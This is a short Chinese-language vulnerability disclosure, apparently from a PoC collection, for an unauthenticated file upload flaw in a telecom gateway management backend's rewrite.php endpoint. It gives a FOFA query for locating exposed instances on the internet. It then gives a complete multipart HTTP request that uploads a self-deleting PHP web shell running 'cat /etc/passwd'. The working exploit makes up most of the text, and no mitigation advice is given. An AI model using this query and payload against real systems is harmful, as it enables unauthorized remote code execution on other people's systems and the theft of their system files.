## 电信网关配置管理后台rewrite.php接口存在文件上传漏洞

电信网关配置管理系统/manager/teletext/material/rewrite.php接口存在文件上传漏洞,未经身份验证的远程攻击者可以利用文件上传漏洞获取系统权限。

## fofa

```
body="img/login_bg3.png" && body="系统登录"
```

## poc

```
POST /manager/teletext/material/rewrite.php HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT
Connection: close
 
------WebKitFormBoundaryOKldnDPT
Content-Disposition: form-data; name="tmp_name"; filename="test.php"
Content-Type: image/png
 
<?php system("cat /etc/passwd");unlink(__FILE__);?>
------WebKitFormBoundaryOKldnDPT
Content-Disposition: form-data; name="uploadtime"
 
 
------WebKitFormBoundaryOKldnDPT--
```

![image-20240531000747444](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405310007491.png)

![image-20240531000810820](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405310008855.png)